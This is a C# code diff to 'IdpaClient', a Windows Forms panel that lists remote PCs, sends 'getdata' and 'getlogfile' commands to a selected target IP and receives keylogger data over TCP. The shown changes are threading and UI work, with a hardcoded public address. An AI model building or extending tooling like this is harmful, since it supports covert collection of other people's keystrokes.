@@ -24,7 +24,10 @@ namespace IdpaClient
         private AutoCompleteStringCollection dateSource = new AutoCompleteStringCollection();
         private AutoCompleteStringCollection wNameSource = new AutoCompleteStringCollection();
         private AutoCompleteStringCollection aNameSource = new AutoCompleteStringCollection();
-        private string IpAddress = "192.168.178.33";
+        private string IpAddress = "84.226.224.226"; //84.226.224.226
+        private string targetIpAdress;
+        public double ping = 0;
+        public string printMsg = "";
 
         private PcInfromations pcInformations = new PcInfromations();
 
@@ -35,6 +38,7 @@ namespace IdpaClient
             GetKeyLoggerData();
 
             Task t = new Task(() => getPcInformations());
+            //t.Start(TaskScheduler.FromCurrentSynchronizationContext());
             t.Start(TaskScheduler.FromCurrentSynchronizationContext());
         }
 
@@ -48,15 +52,28 @@ namespace IdpaClient
         private void getData_Click(object sender, EventArgs e)
         {
             print("Starting download...");
-            adressInfo.Stop();
-            if (ConnectionManager.SendCommand(IpAddress, "getdata"))
+
+            Task.Factory.StartNew(() => initSendCommand());
+
+            //if (ConnectionManager.SendCommand(IpAddress, "getdata"))
+            //{
+            //    //Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(2));
+            //    Task t = new Task(() => ConnectionManager.startAsyncTCPListener(2));
+            //    //t.Start(TaskScheduler.FromCurrentSynchronizationContext());
+            //    t.Start();
+            //}
+            //else print("Target not available");
+        }
+
+        private void initSendCommand()
+        {
+            if (ConnectionManager.SendCommand(targetIpAdress, "getdata"))
             {
-                //Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(2));
-                Task t = new Task(() => ConnectionManager.startAsyncTCPListener(2));
-                t.Start(TaskScheduler.FromCurrentSynchronizationContext());
+                Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(2));
+                //Task t = new Task(() => ConnectionManager.startAsyncTCPListener(2));
+                //t.Start();
             }
-            else print("Target not available");
-            adressInfo.Start();
+            else printMsg += "Target not available \n\r";
         }
 
         private async void refreshLogFile_Click(object sender, EventArgs e)
@@ -65,7 +82,7 @@ namespace IdpaClient
             if (ConnectionManager.SendCommand(IpAddress, "getlogfile"))
             {
                 Task t = new Task(() => ConnectionManager.startAsyncTCPListener(1));
-                t.Start(TaskScheduler.FromCurrentSynchronizationContext());
+                t.Start();
             }
             else print("Target not available");
             adressInfo.Start();
@@ -108,7 +125,17 @@ namespace IdpaClient
         {
             Task t = new Task(() => getPcInformations());
             t.Start(TaskScheduler.FromCurrentSynchronizationContext());
-            //pingServer();
+
+            if(ping.ToString() != pcPingData.Text)
+            {
+                pcPingData.Text = ping.ToString();
+            }
+
+            if(printMsg != "")
+            {
+                print(printMsg);
+                printMsg = "";
+            }
         }
 
         private void GetKeyLoggerData()
@@ -163,47 +190,51 @@ namespace IdpaClient
 
             pcInformations = FileManager.DeserializePcInformations(xml, pcInformations);
 
-            foreach (Pc pc in pcInformations.pc)
-            {
-                ListViewItem lvi = new ListViewItem();
-                lvi.Text = pc.name;
-                lvi.Tag = pc.id;
-                lvi.SubItems.Add(pc.ip);
-
-                bool alredyExist = false;
-
-                foreach (ListViewItem adressInfoList in adressinformation.Items)
+                for (int i = 0; i < pcInformations.pc.Count; i++)
                 {
-                    if (adressInfoList.Text == pc.name && adressInfoList.SubItems[1].Text == pc.ip)
-                        alredyExist = true;
-                }
+                    Pc pc = pcInformations.pc[i];
 
-                if (!alredyExist)
-                {
-                    int adressInfoId = -1;
+                    ListViewItem lvi = new ListViewItem();
+                    lvi.Text = pc.name;
+                    lvi.Name = i.ToString();
+                    lvi.Tag = pc.id;
+                    lvi.SubItems.Add(pc.ip);
+
+                    bool alredyExist = false;
+
                     foreach (ListViewItem adressInfoList in adressinformation.Items)
                     {
-                        if (adressInfoList.Tag.ToString() == pc.id.ToString())
+                        if (adressInfoList.Text == pc.name && adressInfoList.SubItems[1].Text == pc.ip)
+                            alredyExist = true;
+                    }
+
+                    if (!alredyExist)
+                    {
+                        int adressInfoId = -1;
+                        foreach (ListViewItem adressInfoList in adressinformation.Items)
                         {
-                            adressInfoId = adressInfoList.Index;
+                            if (adressInfoList.Tag.ToString() == pc.id.ToString())
+                            {
+                                adressInfoId = adressInfoList.Index;
+                            }
+                        }
+
+                        if (adressInfoId == -1)
+                            adressinformation.Items.Add(lvi);
+                        else
+                        {
+                            adressinformation.Items.RemoveAt(adressInfoId);
+                            adressinformation.Items.Insert(adressInfoId, lvi);
                         }
                     }
-
-                    if (adressInfoId == -1)
-                        adressinformation.Items.Add(lvi);
-                    else
-                    {
-                        adressinformation.Items.RemoveAt(adressInfoId);
-                        adressinformation.Items.Insert(adressInfoId, lvi);
-                    }
                 }
-            }
         }
 
-        private async void pingServer()
+        private void pingServer()
         {
-            double ping = await ConnectionManager.Ping("127.0.0.1");
-            pcPingData.Text = ping.ToString();
+            Task t = new Task(() => ConnectionManager.Ping(targetIpAdress));
+            t.Start();
+            //t.Start(TaskScheduler.FromCurrentSynchronizationContext());
         }
 
         private void Search()
@@ -457,33 +488,21 @@ namespace IdpaClient
             GetKeyLoggerData();
         }
 
-        //public static int BinSearch(ref int[] x, int searchValue)
-        //{
-        //    //Gibt den Index von SearchValue sortiert zurück
-        //    //Gibt -1 zurück wenn searchValue nicht gefunden wird
-        //    int left = 0;
-        //    int right = x.Length;
-        //    return binarySearch(ref x, searchValue, left, right);
-        //}
+        private void adressinformation_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (adressinformation.SelectedItems.Count > 0)
+            {
+                targetIpAdress = adressinformation.SelectedItems[0].SubItems[1].Text;
+                pingServer();
 
-        //private static int binarySearch(ref int[] x, int searchValue, int left, int right)
-        //{
-        //    //Wenn allle Elemente durchsucht wurden dann gibt -1 zurück
-        //    if (right < left)
-        //        return -1;
+                int pcId = int.Parse(adressinformation.SelectedItems[0].Name);
 
-        //    //Ermittle die Mitte des Suchbereiches
-        //    int mid = (left + right) >> 1;
-        //    //Wenn der Suchwert grösser ist als dieser Eintrag machen eine Weitere suche mit dem Bereich: Mitte + 1 und Left
-        //    if (searchValue > x[mid])
-        //        return binarySearch(ref x, searchValue, mid + 1, right);
-        //    //Wenn der Suchwert kleiner ist als dieser Eintrag mache eine Weitere suche mit dem Bereich: right und Mitte -1
-        //    else if (searchValue < x[mid])
-        //        return binarySearch(ref x, searchValue, left, mid - 1);
-        //    //Wenn der Wert nicht kleiner oder grösser ist wurde der gesuchte Wert gefunden er wird ausgegeben
-        //    else
-        //        return mid;
-        //}
+                pcNameData.Text = pcInformations.pc[pcId].name;
+                pcIPData.Text = pcInformations.pc[pcId].ip;
+                pcOnlineData.Text = pcInformations.pc[pcId].time;
+                pcWindowsData.Text = pcInformations.pc[pcId].winVers;
+            }
+        }
     }
 }
 
